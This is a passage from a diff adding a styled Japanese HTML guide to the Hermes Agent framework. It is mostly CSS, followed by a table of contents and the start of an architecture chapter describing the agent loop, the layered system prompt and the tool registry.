@@ -1,0 +1,2736 @@
+<!doctype html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Hermes Agent — 中級・上級者向け完全ガイド</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Syne:wght@400;600;700;800&family=IBM+Plex+Sans+JP:wght@300;400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      :root {
+        --bg-deep: #05080f;
+        --bg-mid: #0a0f1e;
+        --bg-card: #0d1428;
+        --bg-card2: #111930;
+        --neon-green: #00ff88;
+        --neon-cyan: #00e5ff;
+        --neon-purple: #bf5fff;
+        --neon-amber: #ffb700;
+        --neon-red: #ff3d5a;
+        --text-primary: #e8edf8;
+        --text-secondary: #8899bb;
+        --text-muted: #445577;
+        --border-subtle: rgba(0, 229, 255, 0.12);
+        --border-active: rgba(0, 255, 136, 0.4);
+        --glow-green: 0 0 20px rgba(0, 255, 136, 0.35);
+        --glow-cyan: 0 0 20px rgba(0, 229, 255, 0.35);
+        --font-mono: 'Space Mono', monospace;
+        --font-display: 'Syne', sans-serif;
+        --font-body: 'IBM Plex Sans JP', sans-serif;
+        --radius: 8px;
+        --radius-lg: 14px;
+      }
+      *,
+      *::before,
+      *::after {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+      html {
+        scroll-behavior: smooth;
+      }
+      body {
+        background: var(--bg-deep);
+        color: var(--text-primary);
+        font-family: var(--font-body);
+        font-size: 1rem;
+        line-height: 1.75;
+        overflow-x: hidden;
+        position: relative;
+      }
+      body::before {
+        content: '';
+        position: fixed;
+        inset: 0;
+        background: repeating-linear-gradient(
+          0deg,
+          transparent,
+          transparent 2px,
+          rgba(0, 0, 0, 0.07) 2px,
+          rgba(0, 0, 0, 0.07) 4px
+        );
+        pointer-events: none;
+        z-index: 9999;
+      }
+      body::after {
+        content: '';
+        position: fixed;
+        inset: 0;
+        background-image:
+          linear-gradient(rgba(0, 229, 255, 0.025) 1px, transparent 1px),
+          linear-gradient(90deg, rgba(0, 229, 255, 0.025) 1px, transparent 1px);
+        background-size: 60px 60px;
+        pointer-events: none;
+        z-index: 0;
+      }
+      @keyframes fadeInDown {
+        from {
+          opacity: 0;
+          transform: translateY(-28px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+      @keyframes fadeInUp {
+        from {
+          opacity: 0;
+          transform: translateY(28px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+      @keyframes pulse {
+        0%,
+        100% {
+          box-shadow:
+            0 0 30px rgba(0, 255, 136, 0.25),
+            0 0 60px rgba(0, 229, 255, 0.1);
+        }
+        50% {
+          box-shadow:
+            0 0 50px rgba(0, 255, 136, 0.5),
+            0 0 100px rgba(0, 229, 255, 0.25);
+        }
+      }
+      @keyframes growBar {
+        from {
+          width: 0;
+        }
+        to {
+          width: var(--w);
+        }
+      }
+      @keyframes borderSpin {
+        from {
+          background-position: 0% 50%;
+        }
+        to {
+          background-position: 100% 50%;
+        }
+      }
+      /* NAV */
+      .nav {
+        position: sticky;
+        top: 0;
+        z-index: 1000;
+        background: rgba(5, 8, 15, 0.92);
+        backdrop-filter: blur(12px);
+        border-bottom: 1px solid var(--border-subtle);
+        padding: 0 1.5rem;
+        height: 52px;
+        display: flex;
+        align-items: center;
+      }
+      .nav-brand {
+        font-family: var(--font-mono);
+        color: var(--neon-green);
+        font-size: 0.85rem;
+        font-weight: 700;
+        white-space: nowrap;
+        margin-right: 2rem;
+        text-shadow: var(--glow-green);
+      }
+      .nav-links {
+        display: flex;
+        overflow-x: auto;
+        scrollbar-width: none;
+        flex: 1;
+      }
+      .nav-links::-webkit-scrollbar {
+        display: none;
+      }
+      .nav-links a {
+        color: var(--text-secondary);
+        text-decoration: none;
+        font-family: var(--font-mono);
+        font-size: 0.72rem;
+        padding: 0 0.85rem;
+        height: 52px;
+        display: flex;
+        align-items: center;
+        white-space: nowrap;
+        border-bottom: 2px solid transparent;
+        transition:
+          color 0.2s,
+          border-color 0.2s;
+      }
+      .nav-links a:hover {
+        color: var(--neon-cyan);
+        border-bottom-color: var(--neon-cyan);
+      }
+      /* LAYOUT */
+      .container {
+        max-width: 940px;
+        margin: 0 auto;
+        padding: 0 1.5rem;
+        position: relative;
+        z-index: 1;
+      }
+      /* HERO */
+      .hero {
+        padding: 5rem 1.5rem 3.5rem;
+        text-align: center;
+        position: relative;
+        overflow: hidden;
+      }
+      .hero::before {
+        content: '';
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        width: 600px;
+        height: 600px;
+        background: radial-gradient(circle, rgba(0, 255, 136, 0.08) 0%, transparent 70%);
+        transform: translate(-50%, -50%);
+        animation: pulse 4s ease-in-out infinite;
+        pointer-events: none;
+      }
+      .hero-badge {
+        display: inline-block;
+        font-family: var(--font-mono);
+        font-size: 0.72rem;
+        color: var(--neon-green);
+        border: 1px solid rgba(0, 255, 136, 0.4);
+        padding: 0.3rem 0.9rem;
+        border-radius: 100px;
+        margin-bottom: 1.5rem;
+        animation: fadeInDown 0.6s ease both;
+        text-shadow: var(--glow-green);
+      }
+      .hero h1 {
+        font-family: var(--font-display);
+        font-size: clamp(2rem, 5vw, 3.2rem);
+        font-weight: 800;
+        line-height: 1.15;
+        animation: fadeInDown 0.7s ease 0.1s both;
+        background: linear-gradient(
+          135deg,
+          var(--neon-green) 0%,
+          var(--neon-cyan) 60%,
+          var(--neon-purple) 100%
+        );
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+      }
+      .hero-sub {
+        font-size: 1.05rem;
+        color: var(--text-secondary);
+        margin-top: 1rem;
+        animation: fadeInDown 0.8s ease 0.2s both;
+      }
+      .hero-meta {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 1rem;
+        justify-content: center;
+        margin-top: 2rem;
+        animation: fadeInUp 0.9s ease 0.3s both;
+      }
+      .meta-pill {
+        font-family: var(--font-mono);
+        font-size: 0.75rem;
+        color: var(--text-secondary);
+        background: var(--bg-card);
+        border: 1px solid var(--border-subtle);
+        padding: 0.35rem 0.9rem;
+        border-radius: 100px;
+      }
+      .meta-pill span {
+        color: var(--neon-cyan);
+      }
+      /* CHAPTER */
+      .chapter {
+        margin-top: 4rem;
+        padding-top: 2rem;
+        border-top: 1px solid var(--border-subtle);
+      }
+      .chapter-num {
+        display: inline-flex;
+        align-items: center;
+        gap: 0.5rem;
+        font-family: var(--font-mono);
+        font-size: 0.72rem;
+        color: var(--neon-green);
+        margin-bottom: 0.6rem;
+        text-shadow: var(--glow-green);
+      }
+      .chapter-num::before {
+        content: '';
+        display: inline-block;
+        width: 24px;
+        height: 1px;
+        background: var(--neon-green);
+      }
+      h2.chapter-title {
+        font-family: var(--font-display);
+        font-size: 1.75rem;
+        font-weight: 700;
+        color: var(--text-primary);
+        margin-bottom: 0.5rem;
+      }
+      h3.section-title {
+        font-family: var(--font-display);
+        font-size: 1.2rem;
+        font-weight: 600;
+        color: var(--neon-cyan);
+        margin: 2.5rem 0 1rem;
+        padding-left: 1rem;
+        border-left: 3px solid var(--neon-cyan);
+      }
+      p {
+        margin-bottom: 1rem;
+        color: var(--text-primary);
+      }
+      a {
+        color: var(--neon-cyan);
+        text-decoration: none;
+      }
+      a:hover {
+        text-decoration: underline;
+      }
+      ul,
+      ol {
+        padding-left: 1.5rem;
+        margin-bottom: 1rem;
+      }
+      li {
+        margin-bottom: 0.4rem;
+        color: var(--text-primary);
+      }
+      strong {
+        color: var(--neon-green);
+        font-weight: 600;
+      }
+      code {
+        font-family: var(--font-mono);
+        font-size: 0.82em;
+        color: var(--neon-cyan);
+        background: rgba(0, 229, 255, 0.07);
+        padding: 0.1em 0.4em;
+        border-radius: 4px;
+      }
+      /* TOC */
+      .toc-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+        gap: 0.85rem;
+        margin: 2rem 0;
+      }
+      .toc-card {
+        background: var(--bg-card);
+        border: 1px solid var(--border-subtle);
+        border-radius: var(--radius);
+        padding: 1rem 1.1rem;
+        transition:
+          border-color 0.2s,
+          transform 0.2s,
+          box-shadow 0.2s;
+        text-decoration: none;
+        display: block;
+      }
+      .toc-card:hover {
+        border-color: var(--neon-cyan);
+        transform: translateY(-2px);
+        box-shadow: var(--glow-cyan);
+        text-decoration: none;
+      }
+      .toc-num {
+        font-family: var(--font-mono);
+        font-size: 0.7rem;
+        color: var(--neon-green);
+        margin-bottom: 0.3rem;
+      }
+      .toc-label {
+        font-size: 0.88rem;
+        font-weight: 500;
+        color: var(--text-primary);
+        line-height: 1.4;
+      }
+      /* METRIC */
+      .metric-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+        gap: 1rem;
+        margin: 1.5rem 0;
+      }
+      .metric-card {
+        background: var(--bg-card);
+        border: 1px solid var(--border-subtle);
+        border-radius: var(--radius);
+        padding: 1.1rem 1.2rem;
+        text-align: center;
+        transition:
+          transform 0.2s,
+          box-shadow 0.2s;
+      }
+      .metric-card:hover {
+        transform: translateY(-3px);
+        box-shadow: var(--glow-cyan);
+      }
+      .metric-value {
+        font-family: var(--font-display);
+        font-size: 1.8rem;
+        font-weight: 800;
+        color: var(--neon-green);
+        line-height: 1;
+        text-shadow: var(--glow-green);
+      }
+      .metric-label {
+        font-family: var(--font-mono);
+        font-size: 0.68rem;
+        color: var(--text-secondary);
+        margin-top: 0.4rem;
+        text-transform: uppercase;
+        letter-spacing: 0.06em;
+      }
+      /* CODE BLOCK */
+      .code-block {
+        background: #080c18;
+        border: 1px solid rgba(0, 229, 255, 0.15);
+        border-left: 3px solid var(--neon-cyan);
+        border-radius: var(--radius);
+        padding: 1.2rem 1.4rem;
+        overflow-x: auto;
+        margin: 1rem 0 1.5rem;
+        position: relative;
+        font-family: var(--font-mono);
+        font-size: 0.82rem;
+        line-height: 1.65;
+        white-space: pre;
+      }
+      .code-block .cm {
+        color: #4a5f7a;
+      }
+      .code-block .ck {
+        color: var(--neon-purple);
+      }
+      .code-block .cg {
+        color: var(--neon-green);
+      }
+      .code-block .cc {
+        color: var(--neon-cyan);
+      }
+      .code-block .ca {
+        color: var(--neon-amber);
+      }
+      .code-block .cs {
+        color: #78d9a0;
+      }
+      .code-block .cr {
+        color: var(--neon-red);
+      }
+      .code-tag {
+        position: absolute;
+        top: 0.6rem;
+        right: 0.8rem;
+        font-family: var(--font-mono);
+        font-size: 0.62rem;
+        color: var(--text-muted);
+        background: rgba(0, 0, 0, 0.4);
+        padding: 0.15rem 0.5rem;
+        border-radius: 4px;
+      }
+      /* CALLOUT */
+      .callout {
+        border-radius: var(--radius);
+        padding: 1rem 1.3rem;
+        margin: 1.2rem 0;
+        font-size: 0.92rem;
+        display: flex;
+        gap: 0.75rem;
+        align-items: flex-start;
+      }
+      .callout-icon {
+        font-size: 1rem;
+        flex-shrink: 0;
+        margin-top: 0.1rem;
+      }
+      .callout.info {
+        background: rgba(0, 229, 255, 0.07);
+        border: 1px solid rgba(0, 229, 255, 0.25);
+      }
+      .callout.info .callout-icon {
+        color: var(--neon-cyan);
+      }
+      .callout.warning {
+        background: rgba(255, 183, 0, 0.07);
+        border: 1px solid rgba(255, 183, 0, 0.3);
+      }
+      .callout.warning .callout-icon {
+        color: var(--neon-amber);
+      }
+      .callout.danger {
+        background: rgba(255, 61, 90, 0.07);
+        border: 1px solid rgba(255, 61, 90, 0.3);
+      }
+      .callout.danger .callout-icon {
+        color: var(--neon-red);
+      }
+      /* ALERT */
+      .alert {
+        padding: 0.85rem 1.1rem;
+        border-radius: var(--radius);
+        margin: 1rem 0;
+        font-size: 0.9rem;
+        border-left: 4px solid;
+      }
+      .alert.green {
+        background: rgba(0, 255, 136, 0.05);
+        border-color: var(--neon-green);
+        color: var(--neon-green);
+      }
+      .alert.amber {
+        background: rgba(255, 183, 0, 0.05);
+        border-color: var(--neon-amber);
+        color: var(--neon-amber);
+      }
+      .alert.red {
+        background: rgba(255, 61, 90, 0.05);
+        border-color: var(--neon-red);
+        color: var(--neon-red);
+      }
+      .alert.cyan {
+        background: rgba(0, 229, 255, 0.05);
+        border-color: var(--neon-cyan);
+        color: var(--neon-cyan);
+      }
+      /* STEP LIST */
+      .step-list {
+        list-style: none;
+        padding: 0;
+        margin: 1rem 0;
+      }
+      .step-item {
+        display: flex;
+        gap: 1rem;
+        align-items: flex-start;
+        margin-bottom: 1.2rem;
+      }
+      .step-num {
+        flex-shrink: 0;
+        width: 28px;
+        height: 28px;
+        border-radius: 50%;
+        background: linear-gradient(135deg, var(--neon-green), var(--neon-cyan));
+        color: var(--bg-deep);
+        font-family: var(--font-mono);
+        font-size: 0.72rem;
+        font-weight: 700;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .step-content {
+        flex: 1;
+        padding-top: 0.2rem;
+      }
+      .step-title {
+        font-weight: 600;
+        color: var(--text-primary);
+        font-size: 0.95rem;
+      }
+      .step-desc {
+        font-size: 0.88rem;
+        color: var(--text-secondary);
+        margin-top: 0.3rem;
+      }
+      /* ARCH LAYERS */
+      .arch-layers {
+        margin: 1.5rem 0;
+      }
+      .arch-layer {
+        padding: 0.9rem 1.2rem;
+        margin-bottom: 0.5rem;
+        border-radius: var(--radius);
+        background: var(--bg-card);
+        border-left: 4px solid;
+        transition:
+          transform 0.2s,
+          box-shadow 0.2s;
+        display: flex;
+        align-items: center;
+        gap: 1rem;
+      }
+      .arch-layer:hover {
+        transform: translateX(4px);
+        box-shadow: var(--glow-cyan);
+      }
+      .arch-layer.l1 {
+        border-color: var(--neon-green);
+      }
+      .arch-layer.l2 {
+        border-color: var(--neon-cyan);
+      }
+      .arch-layer.l3 {
+        border-color: var(--neon-purple);
+      }
+      .arch-layer.l4 {
+        border-color: var(--neon-amber);
+      }
+      .arch-layer.l5 {
+        border-color: #ff8c42;
+      }
+      .arch-layer.l6 {
+        border-color: var(--neon-red);
+      }
+      .arch-layer.l7 {
+        border-color: #c0c0c0;
+      }
+      .arch-num {
+        font-family: var(--font-mono);
+        font-size: 0.7rem;
+        color: var(--text-muted);
+        flex-shrink: 0;
+        width: 18px;
+      }
+      .arch-title {
+        font-weight: 600;
+        font-size: 0.92rem;
+        flex: 1;
+      }
+      .arch-badge {
+        font-family: var(--font-mono);
+        font-size: 0.65rem;
+        padding: 0.2rem 0.55rem;
+        border-radius: 100px;
+        flex-shrink: 0;
+      }
+      .arch-badge.bypass {
+        background: rgba(255, 183, 0, 0.15);
+        color: var(--neon-amber);
+      }
+      .arch-badge.no-bypass {
+        background: rgba(255, 61, 90, 0.15);
+        color: var(--neon-red);
+      }
+      .arch-badge.auto {
+        background: rgba(0, 229, 255, 0.15);
+        color: var(--neon-cyan);
+      }
+      /* PYRAMID */
+      .pyramid {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 0.4rem;
+        margin: 1.5rem 0;
+      }
+      .pyramid-row {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: var(--radius);
+        font-family: var(--font-mono);
+        font-size: 0.78rem;
+        font-weight: 700;
+        color: var(--bg-deep);
+        transition: transform 0.2s;
+        cursor: default;
+        padding: 0.6rem 1.5rem;
+        text-align: center;
+      }
+      .pyramid-row:hover {
+        transform: scale(1.04);
+      }
+      .pr1 {
+        width: 95%;
+        background: var(--neon-green);
+      }
+      .pr2 {
+        width: 78%;
+        background: var(--neon-cyan);
+      }
+      .pr3 {
+        width: 61%;
+        background: var(--neon-purple);
+        color: #fff;
+      }
+      .pr4 {
+        width: 44%;
+        background: var(--neon-amber);
+      }
+      /* TABLE */
+      .table-wrap {
+        overflow-x: auto;
+        margin: 1rem 0 1.5rem;
+        border-radius: var(--radius);
+        border: 1px solid var(--border-subtle);
+      }
+      table {
+        width: 100%;
+        border-collapse: collapse;
+        font-size: 0.88rem;
+      }
+      thead {
+        background: rgba(0, 229, 255, 0.07);
+      }
+      th {
+        text-align: left;
+        padding: 0.75rem 1rem;
+        font-family: var(--font-mono);
+        font-size: 0.72rem;
+        color: var(--neon-cyan);
+        text-transform: uppercase;
+        letter-spacing: 0.07em;
+        border-bottom: 1px solid var(--border-subtle);
+        white-space: nowrap;
+      }
+      td {
+        padding: 0.7rem 1rem;
+        border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+        color: var(--text-primary);
+        vertical-align: top;
+      }
+      tr:last-child td {
+        border-bottom: none;
+      }
+      tbody tr {
+        transition: background 0.15s;
+      }
+      tbody tr:hover {
+        background: rgba(0, 229, 255, 0.04);
+      }
+      .badge-yes {
+        color: var(--neon-green);
+        font-family: var(--font-mono);
+        font-size: 0.8rem;
+      }
+      .badge-no {
+        color: var(--neon-red);
+        font-family: var(--font-mono);
+        font-size: 0.8rem;
+      }
+      /* COMPARE */
+      .compare-grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 1rem;
+        margin: 1rem 0 1.5rem;
+      }
+      .compare-card {
+        background: var(--bg-card);
+        border-radius: var(--radius);
+        padding: 1rem;
+        border: 1px solid;
+      }
+      .compare-card.good {
+        border-color: rgba(0, 255, 136, 0.3);
+      }
+      .compare-card.bad {
+        border-color: rgba(255, 61, 90, 0.3);
+      }
+      .compare-label {
+        font-family: var(--font-mono);
+        font-size: 0.7rem;
+        margin-bottom: 0.6rem;
+        font-weight: 700;
+        letter-spacing: 0.08em;
+      }
+      .compare-card.good .compare-label {
+        color: var(--neon-green);
+      }
+      .compare-card.bad .compare-label {
+        color: var(--neon-red);
+      }
+      .compare-code {
+        font-family: var(--font-mono);
+        font-size: 0.8rem;
+        color: var(--text-secondary);
+        white-space: pre-wrap;
+        word-break: break-all;
+      }
+      /* PROGRESS */
+      .progress-item {
+        display: flex;
+        align-items: center;
+        gap: 1rem;
+        margin-bottom: 0.8rem;
+      }
+      .progress-label {
+        font-family: var(--font-mono);
+        font-size: 0.75rem;
+        color: var(--text-secondary);
+        width: 160px;
+        flex-shrink: 0;
+      }
+      .progress-bar-wrap {
+        flex: 1;
+        height: 6px;
+        background: rgba(255, 255, 255, 0.06);
+        border-radius: 100px;
+        overflow: hidden;
+      }
+      .progress-bar {
+        height: 100%;
+        border-radius: 100px;
+        animation: growBar 1.2s ease-out both;
+        width: var(--w);
+      }
+      .progress-bar.green {
+        background: linear-gradient(90deg, var(--neon-green), var(--neon-cyan));
+      }
+      .progress-bar.amber {
+        background: linear-gradient(90deg, var(--neon-amber), #ff8c42);
+      }
+      .progress-pct {
+        font-family: var(--font-mono);
+        font-size: 0.72rem;
+        color: var(--text-muted);
+        width: 36px;
+        text-align: right;
+      }
+      /* EXAM GRID */
+      .exam-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+        gap: 1rem;
+        margin: 1.2rem 0;
+      }
+      .exam-card {
+        background: var(--bg-card);
+        border: 1px solid var(--border-subtle);
+        border-radius: var(--radius);
+        padding: 1.1rem;
+        transition:
+          transform 0.2s,
+          box-shadow 0.2s;
+      }
+      .exam-card:hover {
+        transform: translateY(-2px);
+        box-shadow: var(--glow-cyan);
+      }
+      .exam-title {
+        font-family: var(--font-mono);
+        font-size: 0.72rem;
+        color: var(--text-muted);
+        text-transform: uppercase;
+        letter-spacing: 0.07em;
+        margin-bottom: 0.5rem;
+      }
+      .exam-value {
+        font-family: var(--font-display);
+        font-size: 1.1rem;
+        font-weight: 700;
+        color: var(--neon-cyan);
+      }
+      .exam-stars {
+        color: var(--neon-amber);
+        font-size: 0.75rem;
+        margin-top: 0.3rem;
+      }
+      /* TREND CARD */
+      .trend-card {
+        background: var(--bg-card);
+        border: 1px solid var(--border-subtle);
+        border-radius: var(--radius-lg);
+        padding: 1.3rem 1.5rem;
+        margin-bottom: 1rem;
+        position: relative;
+        overflow: hidden;
+        transition:
+          transform 0.2s,
+          box-shadow 0.2s;
+      }
+      .trend-card::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 3px;
+        background: linear-gradient(90deg, var(--neon-green), var(--neon-cyan), var(--neon-purple));
+        animation: borderSpin 3s linear infinite;
+        background-size: 200% 100%;
+      }
+      .trend-card:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 4px 30px rgba(0, 229, 255, 0.12);
+      }
+      .trend-title {
+        font-family: var(--font-display);
+        font-size: 1rem;
+        font-weight: 700;
+        color: var(--text-primary);
+        margin-bottom: 0.4rem;
+      }
+      .trend-desc {
+        font-size: 0.88rem;
+        color: var(--text-secondary);
+      }
+      /* REF GRID */
+      .ref-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+        gap: 0.8rem;
+        margin: 1.2rem 0;
+      }
+      .ref-card {
+        background: var(--bg-card);
+        border: 1px solid var(--border-subtle);
+        border-radius: var(--radius);
+        padding: 0.9rem 1.1rem;
+        display: flex;
+        flex-direction: column;
+        gap: 0.3rem;
+        transition:
+          transform 0.2s,
+          border-color 0.2s;
+        overflow: hidden;
+      }
+      .ref-card:hover {
+        transform: translateX(4px);
+        border-color: var(--neon-green);
+      }
+      .ref-cat {
+        font-family: var(--font-mono);
+        font-size: 0.62rem;
+        color: var(--neon-green);
+        text-transform: uppercase;
+        letter-spacing: 0.1em;
+      }
+      .ref-title {
+        font-size: 0.85rem;
+        font-weight: 500;
+        color: var(--text-primary);
+      }
+      .ref-url {
+        font-family: var(--font-mono);
+        font-size: 0.7rem;
+        color: var(--neon-cyan);
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        text-decoration: none;
+      }
+      .ref-url:hover {
+        text-decoration: underline;
+      }
+      /* MERMAID */
+      .mermaid-wrap {
+        background: #070b16;
+        border: 1px solid var(--border-subtle);
+        border-radius: var(--radius-lg);
+        padding: 1.5rem;
+        margin: 1.2rem 0 1.8rem;
+        overflow-x: auto;
+        text-align: center;
+      }
+      /* DIVIDER */
+      .divider {
+        height: 1px;
+        background: linear-gradient(90deg, transparent, var(--border-subtle), transparent);
+        margin: 3rem 0;
+      }
+      /* FOOTER */
+      .footer {
+        margin-top: 5rem;
+        padding: 2rem 1.5rem;
+        border-top: 1px solid var(--border-subtle);
+        text-align: center;
+        font-family: var(--font-mono);
+        font-size: 0.72rem;
+        color: var(--text-muted);
+      }
+      .footer a {
+        color: var(--neon-cyan);
+      }
+      /* RESPONSIVE */
+      @media (max-width: 900px) {
+        .compare-grid {
+          grid-template-columns: 1fr;
+        }
+        .metric-grid {
+          grid-template-columns: repeat(3, 1fr);
+        }
+        .toc-grid {
+          grid-template-columns: repeat(2, 1fr);
+        }
+      }
+      @media (max-width: 560px) {
+        .hero {
+          padding: 3rem 1rem 2rem;
+        }
+        .nav-brand {
+          display: none;
+        }
+        .toc-grid {
+          grid-template-columns: 1fr;
+        }
+        .metric-grid {
+          grid-template-columns: repeat(2, 1fr);
+        }
+        .progress-label {
+          width: 90px;
+          font-size: 0.68rem;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <nav class="nav">
+      <div class="nav-brand">Hermes Agent ▸ ADVANCED GUIDE</div>
+      <div class="nav-links">
+        <a href="#ch1">01 Architecture</a>
+        <a href="#ch2">02 Security</a>
+        <a href="#ch3">03 Approval</a>
+        <a href="#ch4">04 Auth &amp; Pairing</a>
+        <a href="#ch5">05 Container</a>
+        <a href="#ch6">06 Credentials</a>
+        <a href="#ch7">07 MCP</a>
+        <a href="#ch8">08 Supply-chain</a>
+        <a href="#ch9">09 Profiles</a>
+        <a href="#ch10">10 Delegation</a>
+        <a href="#ch11">11 Cron</a>
+        <a href="#ch12">12 Production</a>
+        <a href="#refs">References</a>
+      </div>
+    </nav>
+
+    <section class="hero">
+      <div class="hero-badge">Nous Research — v0.15.2 — 2026.06.03</div>
+      <h1>Hermes Agent<br />中級・上級者向け完全ガイド</h1>
+      <p class="hero-sub">
+        内部アーキテクチャ / 7層セキュリティ / 本番デプロイメントベストプラクティス
+      </p>
+      <div class="hero-meta">
+        <div class="meta-pill">対象 <span>中〜上級エンジニア</span></div>
+        <div class="meta-pill">バージョン <span>v0.15.2</span></div>
+        <div class="meta-pill">更新 <span>2026年6月3日</span></div>
+        <div class="meta-pill">ライセンス <span>MIT</span></div>
+      </div>
+    </section>
+
+    <div class="container">
+      <div class="metric-grid">
+        <div class="metric-card">
+          <div class="metric-value">70+</div>
+          <div class="metric-label">Registered Tools</div>
+        </div>
+        <div class="metric-card">
+          <div class="metric-value">28</div>
+          <div class="metric-label">Toolsets</div>
+        </div>
+        <div class="metric-card">
+          <div class="metric-value">7</div>
+          <div class="metric-label">Security Layers</div>
+        </div>
+        <div class="metric-card">
+          <div class="metric-value">20+</div>
+          <div class="metric-label">Platform Adapters</div>
+        </div>
+        <div class="metric-card">
+          <div class="metric-value">6</div>
+          <div class="metric-label">Terminal Backends</div>
+        </div>
+        <div class="metric-card">
+          <div class="metric-value">25k+</div>
+          <div class="metric-label">Test Cases</div>
+        </div>
+      </div>
+
+      <div class="toc-grid">
+        <a class="toc-card" href="#ch1"
+          ><div class="toc-num">Ch.01</div>
+          <div class="toc-label">内部アーキテクチャ深掘り</div></a
+        >
+        <a class="toc-card" href="#ch2"
+          ><div class="toc-num">Ch.02</div>
+          <div class="toc-label">セキュリティモデル全体像</div></a
+        >
+        <a class="toc-card" href="#ch3"
+          ><div class="toc-num">Ch.03</div>
+          <div class="toc-label">コマンド承認システム</div></a
+        >
+        <a class="toc-card" href="#ch4"
+          ><div class="toc-num">Ch.04</div>
+          <div class="toc-label">ユーザー認可 &amp; DM Pairing</div></a
+        >
+        <a class="toc-card" href="#ch5"
+          ><div class="toc-num">Ch.05</div>
+          <div class="toc-label">コンテナ分離戦略</div></a
+        >
+        <a class="toc-card" href="#ch6"
+          ><div class="toc-num">Ch.06</div>
+          <div class="toc-label">クレデンシャル安全管理</div></a
+        >
+        <a class="toc-card" href="#ch7"
+          ><div class="toc-num">Ch.07</div>
+          <div class="toc-label">MCP セキュリティ設計</div></a
+        >
+        <a class="toc-card" href="#ch8"
+          ><div class="toc-num">Ch.08</div>
+          <div class="toc-label">サプライチェーンセキュリティ</div></a
+        >
+        <a class="toc-card" href="#ch9"
+          ><div class="toc-num">Ch.09</div>
+          <div class="toc-label">プロファイル多エージェント</div></a
+        >
+        <a class="toc-card" href="#ch10"
+          ><div class="toc-num">Ch.10</div>
+          <div class="toc-label">サブエージェント委譲</div></a
+        >
+        <a class="toc-card" href="#ch11"
+          ><div class="toc-num">Ch.11</div>
+          <div class="toc-label">Cron 高度な活用</div></a
+        >
+        <a class="toc-card" href="#ch12"
+          ><div class="toc-num">Ch.12</div>
+          <div class="toc-label">本番デプロイチェックリスト</div></a
+        >
+      </div>
+
+      <!-- CH1 -->
+      <section class="chapter" id="ch1">
+        <div class="chapter-num">Ch.01 — K-Level: Advanced</div>
+        <h2 class="chapter-title">内部アーキテクチャ深掘り</h2>
+        <p>
+          Hermesの中核は <code>run_agent.py</code> の
+          <strong>AIAgent</strong> クラスです。CLI・Gateway・ACP・Batch
+          Runnerなど全エントリポイントが同一クラスを共有し、プラットフォーム差異はエントリポイント側で吸収されます。
+        </p>
+
+        <h3 class="section-title">エージェントループ — データフロー</h3>
+        <div class="mermaid-wrap">
+          <div class="mermaid">
+            flowchart TD A["User Input\n(CLI / Gateway / ACP)"] --> B["HermesCLI\n.process_input()"]
+            B --> C["AIAgent\n.run_conversation()"] C -->
+            D["prompt_builder\n.build_system_prompt()"] D --> E["runtime_provider\n.resolve()"] E
+            --> F{API Mode} F -->|chat_completions| G["OpenAI 互換 API"] F -->|codex_responses|
+            H["Codex API"] F -->|anthropic_messages| I["Anthropic Messages API"] G & H & I -->
+            J{Tool Call?} J -->|Yes| K["model_tools\n.handle_function_call()"] K -->
+            L["tools/approval.py\n危険コマンド検査"] L -->|承認| M["Tool 実行"] L -->|拒否| N["Error
+            Return"] M --> J J -->|No| O["Final Response"] O --> P["SessionDB\n(SQLite + FTS5)"]
+          </div>
+        </div>
+
+        <h3 class="section-title">プロンプトの3層構造</h3>
+        <p>
+          システムプロンプトは安定度別に3層に分割されており、会話中は変更されません（プロンプトキャッシュ最適化のため）。
+        </p>
+        <div class="arch-layers">
+          <div class="arch-layer l1">
+            <div class="arch-num">1</div>
+            <div class="arch-title">
+              <strong>stable 層</strong> — エージェントID / SOUL.md / ツールスキーマ(28ツールセット)
+              / スキルインデックス
+            </div>
+            <span class="arch-badge no-bypass">キャッシュ対象</span>
+          </div>
+          <div class="arch-layer l2">
+            <div class="arch-num">2</div>
+            <div class="arch-title">
+              <strong>context 層</strong> — AGENTS.md / CLAUDE.md / .cursorrules /
+              プロジェクトコンテキスト
+            </div>
+            <span class="arch-badge bypass">プロジェクト固有</span>
+          </div>
+          <div class="arch-layer l3">
+            <div class="arch-num">3</div>
+            <div class="arch-title">
+              <strong>volatile 層</strong> — MEMORY.md (~800 tokens) / USER.md (~500 tokens) /
+              タイムスタンプ
+            </div>
+            <span class="arch-badge auto">セッション毎</span>
+          </div>
+        </div>
+
+        <div class="callout warning">
+          <div class="callout-icon">⚠</div>
+          <div>
+            <strong>/model</strong>
+            コマンドを実行するとツールスキーマが変更され、プロンプトキャッシュが無効化されます。次の推論呼び出しで全トークンが再送されるためコストが増加します。
+          </div>
+        </div>
+
+        <h3 class="section-title">ツールレジストリの依存チェーン</h3>
+        <div class="pyramid">
+          <div class="pyramid-row pr1">run_agent.py / cli.py / batch_runner.py</div>
+          <div class="pyramid-row pr2">model_tools.py（ツール発見・スキーマ収集）</div>
+          <div class="pyramid-row pr3">tools/*.py（import時に自動登録）</div>
